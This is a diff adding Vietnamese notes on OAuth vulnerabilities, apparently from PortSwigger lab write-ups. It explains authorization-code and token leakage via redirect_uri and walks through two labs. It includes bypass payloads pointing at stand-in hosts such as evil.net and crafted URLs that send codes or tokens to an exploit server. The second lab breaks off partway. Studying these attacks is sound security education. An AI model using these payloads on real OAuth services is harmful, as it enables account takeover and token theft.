@@ -312,12 +312,299 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
 
   &rarr; Thành công xóa một user.
 
+---
+
+### 5.2. Leaking authorization codes and access tokens
+
+- Tùy thuộc vào loại ủy quyền, một authorization coded hoặc access token sẽ được gửi qua trình duyệt của nạn nhân tới endpoint /callback được chỉ định trong tham số redirect_uri của yêu cầu ủy quyền.
+
+- Nếu dịch vụ OAuth không xác thực đúng cách URI này, ta có thể xây dựng một cuộc tấn công giống như CSRF, lừa trình duyệt của nạn nhân khởi tạo một quy trình OAuth sẽ gửi authorization coded hoặc access token đến redirect_uri do kẻ tấn công kiểm soát.
+
+- Trong trường hợp authorization code flow, ta có thể lấy cắp mã của nạn nhân trước khi nó được sử dụng. Sau đó, có thể gửi mã này đến endpoint /callback hợp lệ của client application (redirect_uri gốc) để truy cập vào tài khoản của người dùng.
+  
+- Trong kịch bản này, ta thậm chí không cần biết client_secret hoặc access token. Miễn là nạn nhân có một phiên hợp lệ với dịch vụ OAuth, client application sẽ chỉ đơn giản hoàn tất việc trao đổi mã/tokens thay mặt ta trước khi đăng nhập vào tài khoản của nạn nhân.
+  
+- Lưu ý rằng việc sử dụng ***state*** hoặc ***nonce*** không nhất thiết ngăn chặn các cuộc tấn công này vì ta có thể tạo ra các giá trị mới từ trình duyệt của riêng mình.
+
+- Note: ***Authorization servers an toàn hơn sẽ yêu cầu một tham số redirect_uri được gửi khi trao đổi mã. Server sau đó có thể kiểm tra xem tham số này có khớp với cái mà nó nhận được trong yêu cầu ủy quyền ban đầu hay không và sẽ từ chối trao đổi nếu không khớp. Vì điều này xảy ra trong các yêu cầu server to server thông qua một back-channel an toàn, nên ta sẽ không thể kiểm soát tham số redirect_uri thứ hai này.***
+
+### Lab: OAuth account hijacking via redirect_uri
+
+- Giao diện trang web ta thực hiện khai thác:
+
+  <img width="1919" height="942" alt="image" src="https://github.com/user-attachments/assets/950f54e0-f32a-441a-b751-4c8aefcae886" />
+
+- Giao diện cho phép user đăng nhập bằng liên kết social media:
+
+  <img width="1919" height="933" alt="image" src="https://github.com/user-attachments/assets/524d81cf-fdf4-4603-9f5c-ec199ab94412" />
+
+- Sử dụng một tài khoản social media sẵn: ***wiener:peter*** để đăng nhập. Giao diện khi đăng nhập thành công:
+
+  <img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/6e6e6884-2d0d-414a-98cd-a37bfd44cd38" />
+
+- Kể từ đây, sau mỗi lần đằng xuất và đăng nhập lại, ta thấy tài khoản trên được đăng nhập lại tức thì, do đó có thể nhận thấy có một phiên đang hoạt động với dịch vụ OAuth, nên ta không cần phải nhập lại thông tin xác thực của mình để xác thực.
+
+- Trong Burp, bật chế độ Proxy Interception, ta nhận thấy một yêu cầu xác thực GET request, bắt đầu với ***GET /auth?client_id=[...]*** trong đó chứa ***redirect_uri*** là endpoint /oauth-callback:
+
+  <img width="1919" height="922" alt="image" src="https://github.com/user-attachments/assets/1262af37-1366-4bed-9e6c-5a39541ab13f" />
+
+- Ngay sau khi thực hiện forward GET request này, ngay lập tức ta sẽ được chuyển hướng đến redirect_uri cùng với authorization code trong chuỗi truy vấn:
+
+  <img width="1868" height="637" alt="image" src="https://github.com/user-attachments/assets/8e4fffcd-4eba-4c3f-be4d-542a6bda90fb" />
+
+- Thực hiện gửi GET request ủy quyền vào trong chế độ Burp Repeater, và thực hiện sửa đổi tham số ***redirect_uri*** tùy ý, thực hiện gửi request và thấy được rằng server không báo lỗi, thay vào đó đầu vào ta nhập được sử dụng để tạo redirect trong phản hồi.
+
+  <img width="1868" height="856" alt="image" src="https://github.com/user-attachments/assets/4458edbe-ea7b-4494-a07f-48adadcf8d58" />
+
+- Thực hiện thay đổi tham số ***redirect_uri*** thành domain lấy từ Burp Collaborator, sau đó thực hiện gửi request và follow redirection:
+
+  <img width="1864" height="798" alt="image" src="https://github.com/user-attachments/assets/ef8ca28f-d6b2-4a92-b6df-a942883e416d" />
+
+- Ta nhận thấy một request có chứa authorization code gửi đến server Collab:
+
+  <img width="1918" height="918" alt="image" src="https://github.com/user-attachments/assets/58c767b8-7760-44b3-9a72-523bcdbffcac" />
+
+  &rarr; Điều này xác nhận rằng ta có thể rò rỉ authorization code ra external domain.
+
+- Trên exploit server của ta, thực hiện tạo một request trong đó phần body tạo một thê ***iframe*** với thuộc tính src ta tạo với nội dung link: ***https://oauth-0ae500b0044262ed83b75dbf02ff00ca.oauth-server.net/auth?client_id=aiub01nvs4sng53f9kvva&redirect_uri=https://exploit-0a13003a04b46295832c5e80015a0041.exploit-server.net&response_type=code&scope=openid%20profile%20email***, với ***redirect_uri*** ta để là domain của *exploit server*, sau đó thực hiên gửi đến cho victim ở đây là admin user và chờ payload được kích hoạt do admin click mở vào đường link giấu trong thẻ <iframe>.
+
+  <img width="1917" height="937" alt="image" src="https://github.com/user-attachments/assets/72afe568-846b-4c92-82a5-3c5bf7507e42" />
+
+- Kiểm tra, access log của exploit server của ta, nhận thấy có một request trả về authorization code bị rò rỉ &rarr; admin đã login sẵn vào OAuth provider và session đó còn hiệu lực và khi admin ấn vào payload, OAuth server sẽ không hỏi lại username/password. Thay vào đó, OAuth flow chạy thẳng → cấp code/token ngay:
+
+  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/0157070c-1494-4069-8901-7e6004a0d5bb" />
+
+- Thực hiện đăng xuất tải khoản cũ, sau đó thực hiện truy cập đến:
+
+  ```url
+  https://0a4e001904de624083755f190006004b.web-security-academy.net/oauth-callback?code=cZCc1G_sDibt0-v3qIYUMyZI3f8ogEqgVNKp6frrk0I
+  ````
+
+  Trong đó tham số ***code*** là lấy từ authorization code gửi về cho exploit server lấy từ mục access log.
+
+  Lúc này phần còn lại của flow OAuth sẽ được hoàn thành tự động và ta sẽ được đăng nhập với tư cách người dùng quản trị.
+
+  <img width="1917" height="939" alt="image" src="https://github.com/user-attachments/assets/76040d04-c2cc-4f55-acd6-9d29e3524aa3" />
+
+  Thực hiện xóa thành công user carlos trong tài khoản admin:
+
+  <img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/1662ae91-b665-403e-b28c-cf311fed3094" />
+  
+### Flawed redirect_uri validation
+
+- Các client application có thể sử dụng một whitelist chính xác các callback URIs mà đã đăng ký với với dịch vụ OAuth. Bằng cách này, khi dịch vụ OAuth nhận được một yêu cầu mới, nó có thể xác thực tham số redirect_uri so với whitelist này.
+
+- Tuy nhiên, vẫn có một số cách để thực hiện bypass:
+
+  - Chỉ kiểm tra “bắt đầu bằng” (prefix match): Một số server chỉ check chuỗi bắt đầu đúng domain hợp lệ (startsWith) &rarr; thêm ***path/query/fragment*** tùy ý để xem ta có thể thay đổi điều gì mà không bị kích hoạt lỗi.
+ 
+    Thêm/đổi path:
+
+    ```url
+    redirect_uri=https://victim.com/callback/extra
+    redirect_uri=https://victim.com/callback../alt
+    ```
+
+    Thêm query/fragment:
+    
+    ```url
+    redirect_uri=https://victim.com/callback?next=https://evil.net
+    redirect_uri=https://victim.com/callback#https://evil.net
+    ```
+
+  - Lợi dụng cách parser khác nhau (URL confusion). Một URL chuẩn có cấu trúc như sau:
+ 
+    ```
+    scheme://[userinfo@]host[:port]/path?query#fragment
+    ```
+
+    userinfo@ = phần “username:password” trước dấu @
+
+    host = domain thật sự.
+
+    Nhiều OAuth server/validator lại check redirect_uri bằng string-compare, hoặc parser custom ⇒ dẫn đến cách hiểu khác nhau.
+
+    Ví dụ với payload:
+
+    ```url
+    https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
+    ```
+
+    Khi validator không parse URL chuẩn mà chỉ làm kiểu string-check (ví dụ: startsWith("https://victim.com") hoặc contains("victim.com")) → server tưởng là domain hợp       lệ (victim), và cho phép redirect uri này.
+
+    Nếu OAuth server check redirect_uri bằng string-compare hoặc regex đơn giản, nó thấy "victim.com&" và nghĩ chỉ là query param, chứ không nhận ra đây là userinfo.
+
+    Bypass filter: & khiến URL trông giống query string (victim.com&param=...) chứ không giống username, nên dễ bị bỏ qua.
+
+    Nhưng phía browser/client application hiểu phần trước dấu @ là userinfo và host là phần sau dấu @ cho đến #, nên host thực sự mà browser connect = foo.evil-user.net.     Browser hoàn toàn bỏ qua dấu &, nó chỉ coi là một ký tự bình thường trong userinfo.
+
+    #@bar.evil.net/ chỉ là fragment (client-side thôi, server không thấy), được dùng để có thể lợi dụng thêm trong front-end (nếu app JS xử lý hash).
+
+  - Server-Side Parameter Pollution (SSPP). Gửi trùng tham số redirect_uri:
+ 
+    ```url
+    https://auth.victim.com/authorize?client_id=123&redirect_uri=https://client.com/cb&redirect_uri=https://evil.net
+    ```
+
+    Tùy stack back-end: lấy tham số đầu, cuối, hay join. Nếu validator check cái đầu nhưng handler dùng cái cuối ⇒ bypass.
+
+  - “Đặc quyền” cho localhost. Nhiều hệ thống allow http://localhost trong môi trường dev và quên tighten ở prod:
+
+    Bypass: đăng ký/redirect domain na ná:
+    
+    ```
+    http://localhost.evil-user.net/cb
+    http://127.0.0.1.evil-user.net/cb
+    http://[::1].evil-user.net/cb
+    ```
+
+    Validator ngu ngơ chỉ startsWith("http://localhost") → toang.
+
+- Cũng cần lưu ý rằng bạn không nên giới hạn việc kiểm tra của mình chỉ vào việc kiểm tra tham số redirect_uri một cách tách biệt. Đôi khi, việc thay đổi một tham số có thể ảnh hưởng đến việc xác thực các tham số khác. Ta có thể thử đổi response_mode để xem validation thay đổi không, vì có lúc đổi mode sẽ phá vỡ logic check redirect_uri → mở đường bypass.
+
+- Ví dụ, việc thay đổi response_mode từ query sang fragment đôi khi có thể hoàn toàn thay đổi cách phân tích redirect_uri:
+
+  ```url
+  https://auth.server.com/authorize?client_id=123&response_type=code&response_mode=fragment&redirect_uri=https://app.victim.com/callback#@evil.net
+  ```
+
+  Validator chỉ so sánh phần trước dấu #. Thấy https://app.victim.com/callback → hợp lệ.
+
+  Nhưng khi AS redirect, client application nhận:
+
+  ```
+  https://app.victim.com/callback#@evil.net&code=ABC123
+  ```
+
+  Nếu front-end JS xử lý location.hash không chuẩn (ví dụ parse @evil.net như một URL → redirect tiếp), ta có thể lấy được ***code=ABC123***.
+
+- Hoặc nếu server hỗ trợ ***web_message***, thay vì strict check redirect_uri đúng domain, nhiều implementation chỉ check origin domain (ví dụ *.victim.com). Nên ta có thể tận dụng để đăng ký với domain:
+
+  ```
+  redirect_uri=https://evil.victim.com/callback
+  ```
+
+  &rarr; bypass.
+
+### Stealing codes and access tokens via a proxy page
+
+- Một cách khác khi đường cùng lực kiệt là thử cố gắng thay đổi tham số redirect_uri trỏ tới một domain khác nằm trong whitelist domain của OAuth.
+
+- Cố gắng tìm cách để có thể truy cập thành công vào các miền con hoặc đường dẫn khác nhau. Ví dụ, URI mặc định thường sẽ nằm trên một đường dẫn cụ thể OAuth, chẳng hạn như /oauth/callback. Lúc này, ta có thể sử dụng các thủ thuật duyệt thư mục để cung cấp bất kỳ đường dẫn tùy ý nào trên miền như, giống path traversal:
+
+  ```url
+  https://client-app.com/oauth/callback/../../example/path
+  ```
+
+  Phía back-end có thể được hiểu thành:
+
+  ```
+  https://client-app.com/example/path
+  ```
+
+  Sau khi đã xác định được trang khác ta có thể thiết lập làm URI chuyển hướng, ta cần kiểm tra chúng để tìm đường rò rỉ query/fragment (nơi code/token nằm).
+
+  Đối với authorization code flow, ta cần tìm một lỗ hổng cho phép đọc query param, trong khi đối với loại implicit grant type, ta cần trích xuất URL fragment. Một trong   những lỗ hổng hữu ích nhất cho mục đích này là open redirect, sử dụng nó như một "proxy".
+
+  Giả sử, ta bypass được whitelist để redirect tới một endpoint hợp lệ của app:
+
+  ```url
+  https://victim.com/redirect?next=https://evil.net
+  ```
+
+  tức là ***redirect_uri=https://victim.com/redirect*** là một endpoint hợp lệ trong whitelist mà ta tìm được, tuy nhiên nó tồn tài lỗ hổng *open redirect* → Khi user bị   redirect về đây, victim.com sẽ 302 tiếp sang https://evil.net.
+
+  Do đó, mà OAuth flow sẽ trả về như sau và ta vẫn thu được code/token:
+
+  ```url
+  https://victim.com/redirect?next=https://evil.net?code=ABC123
+  ```
+
+- Với implicit grant type, toàn quá trình được diễn ra qua browser và token xuất hiện ngay trên URL fragment trong browser. Nếu attacker lấy được access token này → có thể gọi trực tiếp API của OAuth Resource Server. Nghĩa là không chỉ login vào app nạn nhân, mà còn có thể query dữ liệu user (email, danh bạ, file, …) ngoài phạm vi app web.
+
+### Lab: Stealing OAuth access tokens via an open redirect
+
+- Giao diện trang web ta thực hiện khai thác:
+
+  <img width="1912" height="944" alt="image" src="https://github.com/user-attachments/assets/a09f7850-b066-4c60-85ca-6480f067ec40" />
+
+- Tương tư, các bài lab trên, web cho phép đăng nhập liên kết với social media, ta thực hiện đăng nhập với một tài khoản social của mình là: *wiener:peter*:
+
+  <img width="1918" height="939" alt="image" src="https://github.com/user-attachments/assets/feaa3099-b04e-4b81-99ea-24a43875e131" />
+
+- Trong Proxy Interception của Burp, ta nhận thấy web thực hiện một cuộc gọi API tới userinfo endpoint là /me, sau đó sử dụng dữ liệu mà nó lấy để đăng nhập.
+  
+  <img width="1574" height="512" alt="image" src="https://github.com/user-attachments/assets/fb7f47f3-5fc2-4d7a-b421-32c0c2f3f9ea" />
+
+  Cùng với đó là requets: */auth?client_id...*
+
+  <img width="1574" height="513" alt="image" src="https://github.com/user-attachments/assets/7c4ca80a-8d18-4bb2-bdc2-ccbf96cb41cd" />
+
+  Ngoài ra, với GET request *GET /auth?client_id=[...]*, khi thực hiện thay đổi tham số *redirect_uri* trong rồi thực hiện gửi lại cho OAuth trong Repeater, ta nhận thấy   tham số này đang được xác thực theo một whitelist được đăng ký:
+
+  <img width="1564" height="894" alt="image" src="https://github.com/user-attachments/assets/76de66fc-4fd4-4fd7-85d0-af9e1aa1bc69" />
+
+  Tuy nhiên nếu ta sử dụng path traversall /../ như đã đề cập thì lại không gặp lỗi đó:
+
+  <img width="1882" height="895" alt="image" src="https://github.com/user-attachments/assets/4b0d1798-bd04-4db4-bc5e-29d598f544c9" />
+
+  Thực hiện tạo directory traversal là: */oauth-callback/../post?postId=1* (vì khi để post không và thực hiện gửi request sau đó redirect sẽ bị báo lỗi missing param       postId):
+
+  <img width="1882" height="885" alt="image" src="https://github.com/user-attachments/assets/def3aa67-3c07-492d-8e14-314679b33359" />
+
+  Khi thực hiện follow redirection, sẽ được chuyến hướng tới trang bài báo id = 1:
+
+  <img width="1878" height="920" alt="image" src="https://github.com/user-attachments/assets/f2c47eaa-483a-424a-a276-41fc88ee60ff" />
+
+  &rarr; Ta cũng để ý nhận thấy được rằng *access token* được bao gồm trong phần #fragment của URL.
+
+  <img width="1880" height="511" alt="image" src="https://github.com/user-attachments/assets/73ed71d1-9ea3-4798-bbe7-7381d0281274" />
+
+  Tiếp tục để ý thấy rằng trong mỗi bài post trong blog, có một tùy chọn là "Next post" để chuyển hướng sang bài viết tiếp theo, hoạt động bằng cách chuyển hướng người     dùng đến đường dẫn được chỉ định trong tham số truy vấn với GET request /post/next?path=[...]:
+
+  <img width="1864" height="551" alt="image" src="https://github.com/user-attachments/assets/473e5c44-6c05-4ae4-a3b0-badebfd2ed46" />
+
+  &rarr; lỗ hổng open redirect.
+
+  Tận dụng open redirect như đã đề cập ở trên, ta tạo một URL sẽ khởi động một quy trình OAuth với redirect_uri trỏ đến chỗ open redirect như trên, sau đó thực hiện        chuyển tiếp đến exploit server của ta:
+
+  ```
+  https://oauth-0a6a004e041e9f2180fef1df026f00a9.oauth-server.net/auth?client_id=pzaphg5dxngdwfczpt306&redirect_uri=https://0a2500c104f59f5d8049f35700f6007c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5c00c204979f178005f262010c0058.exploit-server.net/exploit&response_type=token&nonce=-1090283847&scope=openid%20profile%20email
+  ```
+
+  Kết quả khi thực hiện truy cập đường dẫn URl, ta sẽ tháy nó chuyển hướng về trang exploit server "Hello World!"
+
+  <img width="1919" height="1005" alt="Screenshot 2025-08-28 013504" src="https://github.com/user-attachments/assets/b5ed51a7-8822-4ef0-95cd-d9bc38c5ce3e" />
+
+  Cùng với đó ta để ý thấy rằng access token được trả về trong URL fragment.
+
+  
+
+  
+
+
+  
+
+  
+
+
+
+  
+
+  
+
+  
 
 
   
 
 
 
+  
+
+  
+  
+  
 
 
 
